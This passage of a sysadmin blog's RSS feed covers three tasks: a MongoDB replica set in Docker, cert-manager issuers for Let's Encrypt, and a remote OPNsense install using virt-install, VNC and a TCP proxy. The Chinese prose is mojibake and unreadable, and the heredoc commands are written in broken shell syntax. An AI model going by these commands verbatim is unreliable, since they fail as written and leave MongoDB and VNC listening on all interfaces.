&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å…ˆgen keyfile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;openssl rand -base64 &lt;span class=&#34;m&#34;&gt;756&lt;/span&gt; &amp;gt; keyfile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; keyfile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å‡†å¤‡mongod.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EOF &amp;lt; cat &amp;gt; /data/mongodb/27017/conf/mongod.conf 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemLog:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   destination: file
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   path: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/data/db/mongod.log&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   logAppend: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   bindIp: 0.0.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   port: &lt;span class=&#34;m&#34;&gt;27017&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;security:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   keyFile: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/data/configdb/keyfile&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EOF &amp;lt; cat &amp;gt; /data/mongodb/docker-compose.yaml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  mongo:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: mongo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: mongo:8.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    restart: always
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      TZ: Asia/Shanghai
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - /data/mongodb/27017/data:/data/db
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - /data/mongodb/27017/conf/mongod.conf:/data/configdb/mongod.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - ./keyfile:/data/configdb/keyfile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: --replSet rs0 --config /data/configdb/mongod.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 27017:27017
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker compose up -d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¸ç®—å®Œå•Šï¼Œå¯åŠ¨ä¹‹åéœ€è¦è¿›å…¥å®¹å™¨æ‰§è¡Œ&lt;code&gt;rs.initiate()&lt;/code&gt;, æ”¾å¿ƒå¤§èƒ†çš„æ‰§è¡Œï¼Œä¸ä¼šç ´åä»»ä½•åŸæœ‰çš„æ•°æ®&lt;/p&gt;</description>
    </item>
    <item>
      <title>cert-managerçš„ä¸åŒclusterissueréªŒè¯æ–¹å¼</title>
      <link>https://rendoumi.com/posts/20251024-certmanager_issuer/</link>
      <pubDate>Fri, 24 Oct 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251024-certmanager_issuer/</guid>
      <description>&lt;p&gt;cert-manageræ™®é€šç­¾å‘è¯ä¹¦çš„æ—¶å€™ï¼Œé€šå¸¸æ˜¯DNSçš„Aè®°å½•å·²ç»è§£æåˆ°ç›¸å…³çš„Ingresså‰ç½®çš„LB å…¬ç½‘IPäº†ã€‚&lt;/p&gt;
&lt;h5 id=&#34;ç¬¬ä¸€ç§æƒ…å†µæœ‰å…¬ç½‘ipçš„è¯ä¹¦ç­¾å‘éªŒè¯æ–¹å¼æ˜¯http&#34;&gt;ç¬¬ä¸€ç§æƒ…å†µï¼Œæœ‰å…¬ç½‘IPçš„è¯ä¹¦ç­¾å‘ï¼ŒéªŒè¯æ–¹å¼æ˜¯http&lt;/h5&gt;
&lt;p&gt;é‚£å‡†å¤‡å¥½cluster-issuer.yaml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: cert-manager.io/v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: ClusterIssuer
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: letsencrypt-prod1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;spec:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  acme:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server: https://acme-v02.api.letsencrypt.org/directory
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    email: zhangranrui@rendoumi.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    privateKeySecretRef:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      name: letsencrypt-prod1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    solvers:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    - http01:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ingress:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          class: nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;ç¬¬äºŒç§æƒ…å†µå¦‚æœé›†ç¾¤æ˜¯éƒ¨ç½²åœ¨å†…ç½‘æ ¹æœ¬æ²¡æœ‰å…¬ç½‘ipå°±ä¸èƒ½é€šè¿‡80å’Œ443çš„éªŒè¯æ¥ç­¾å‘äº†åªèƒ½ç”¨dnsæ ¡éªŒçš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦&#34;&gt;ç¬¬äºŒç§æƒ…å†µï¼Œå¦‚æœé›†ç¾¤æ˜¯éƒ¨ç½²åœ¨å†…ç½‘ï¼Œæ ¹æœ¬æ²¡æœ‰å…¬ç½‘ipï¼Œå°±ä¸èƒ½é€šè¿‡80å’Œ443çš„éªŒè¯æ¥ç­¾å‘äº†ï¼Œåªèƒ½ç”¨DNSæ ¡éªŒçš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦&lt;/h5&gt;
&lt;p&gt;é‚£ä»¥cloudflareæ‰˜ç®¡çš„DNSä¸ºä¾‹ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°CFçš„dns-apiçš„tokenï¼Œç„¶åå£°æ˜ï¼Œå†å®šä¹‰ClusterIssuer&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: Secret
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: cloudflare-api-token-secret
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;type: Opaque
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;stringData:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  api-token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: cert-manager.io/v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: ClusterIssuer
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: letsencrypt-prod2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;spec:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  acme:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server: https://acme-v02.api.letsencrypt.org/directory
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    email: zhangranrui@rendoumi.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    privateKeySecretRef:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      name: letsencrypt-prod2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    solvers:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    - dns01:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        cloudflare:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          email: zhangranrui@rendoumi.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          apiTokenSecretRef:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            name: cloudflare-api-token-secret
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            key: api-token
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ç¬¬ä¸€ç§å’Œç¬¬äºŒç§çš„åŒºåˆ«å°±æ˜¯solversæ˜¯ä¸åŒçš„ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>OPNsenseçš„è¿œç¨‹å®‰è£…å¹¶è®¿é—®WEBGUI</title>
      <link>https://rendoumi.com/posts/20251023-opnsense_install/</link>
      <pubDate>Thu, 23 Oct 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251023-opnsense_install/</guid>
      <description>&lt;p&gt;OPNsenseå®‰è£…å…¶å®å¾ˆå®¹æ˜“ï¼Œä½†æ˜¯è¿œç¨‹è£…å°±ä¸é‚£ä¹ˆå¥½ç©äº†ã€‚&lt;/p&gt;
&lt;p&gt;å°¤å…¶æ¶‰åŠåˆ°å†…ç½‘WEBGUIçš„è®¿é—®ï¼Œç¼ºçœå®‰è£…å®Œæˆä»¥åï¼Œåªèƒ½ä»å†…ç½‘å£è®¿é—®ç®¡ç†ç•Œé¢ï¼Œé—®é¢˜æ˜¯VPCé‡Œåªæœ‰ä¸€å°Linuxæœºå™¨ï¼Œè¿˜æ²¡æœ‰æµè§ˆå™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œå¤‡æŸ¥ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€ä¸‹è½½isoé•œåƒå¹¶è§£å‹&#34;&gt;ä¸€ã€ä¸‹è½½isoé•œåƒå¹¶è§£å‹&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://pkg.opnsense.org/releases/25.7/OPNsense-25.7-dvd-amd64.iso.bz2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bzip2 -d OPNsense-25.7-dvd-amd64.iso.bz2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äºŒkvmç”¨virt-installå®‰è£…isoæ³¨æ„æ¡¥æ¥äº†2ä¸ªç½‘å¡&#34;&gt;äºŒã€kvmç”¨virt-installå®‰è£…isoï¼Œæ³¨æ„æ¡¥æ¥äº†2ä¸ªç½‘å¡&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;mkdir -p /export/kvm/opn/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;qemu-img create -f qcow2 /export/kvm/opn/opn.qcow2 20G
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-install &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;opn &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vcpu&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--ram&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--disk &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/kvm/opn/opn.qcow2,format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;qcow2,size&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--cdrom&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/kvm/iso/OPNsense-25.7-dvd-amd64.iso &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--network &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0,model&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;virtio &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--network &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br1,model&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;virtio &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--os-type unix &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--os-variant freebsd13.1 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vnc --vnclisten&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0 --vncport&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5901&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;ä¸‰vncè¿åˆ°port-5901ä¸Šè¿›è¡Œå®‰è£…é…ç½®&#34;&gt;ä¸‰ã€vncè¿åˆ°port 5901ä¸Šè¿›è¡Œå®‰è£…é…ç½®&lt;/h5&gt;
&lt;p&gt;OPNsenseå…¬ç½‘çš„ç½‘å¡ã€ipã€maskã€gatewayé…ç½®&lt;/p&gt;
&lt;p&gt;OPNsenseå†…ç½‘çš„ç½‘å¡ã€ipã€maské…ç½®&lt;/p&gt;
&lt;h5 id=&#34;å››è®¾ç½®å†…ç½‘è®¿é—®&#34;&gt;å››ã€è®¾ç½®å†…ç½‘è®¿é—®&lt;/h5&gt;
&lt;p&gt;è¿™é‡Œå°±éå¸¸é¬¼ç•œäº†ï¼Œé¦–å…ˆåœ¨å†…ç½‘çš„é‚£å°æœºå™¨ä¸Šåšportè½¬å‘ï¼Œè¿™å°æœºå™¨æ˜¯192.168.100.2ï¼Œåšä¸ªsystemdçš„service:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/systemd/system/opn-proxy.service
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Unit&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;After&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;network.target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Wants&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;network.target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Service&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;WorkingDirectory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/bin/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;simple
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ExecStart&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/bin/go-tcp-proxy_1.0.2_linux_amd64 -l &lt;span class=&#34;s2&#34;&gt;&amp;#34;:4430&amp;#34;&lt;/span&gt; -r &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.100.1:4430&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Restart&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on-failure
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;RestartSec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Install&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;WantedBy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸Šçš„è¯ï¼Œå¦‚æœwebè®¿é—®http://192.168.100.2:4430ï¼Œé‚£Host: 192.168.100.1 ä¼šè¢«è½¬å‘ç»™ 192.168.100.1 çš„OPNsenseçš„4430ç«¯å£&lt;/p&gt;
&lt;p&gt;é‚£OPNsenseçš„å†…ç½‘IPæ˜¯192.168.100.1ï¼Œç™»å½•ç”¨æˆ·æ˜¯rootï¼Œå¯†ç æ˜¯xxxxxxxx&lt;/p&gt;
&lt;p&gt;ä»vncä¸Šç™»å½•ï¼Œç„¶åè¿›å…¥shellï¼Œæ‰¾åˆ°webguiçš„éƒ¨åˆ†ï¼Œæ·»åŠ portå’Œalthostnamesçš„ä¸¤é¡¹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /conf/config.xml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;webgui&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;protocol&amp;gt;https&amp;lt;/protocol&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;ssl-certref&amp;gt;68adc26101eeb&amp;lt;/ssl-certref&amp;gt;
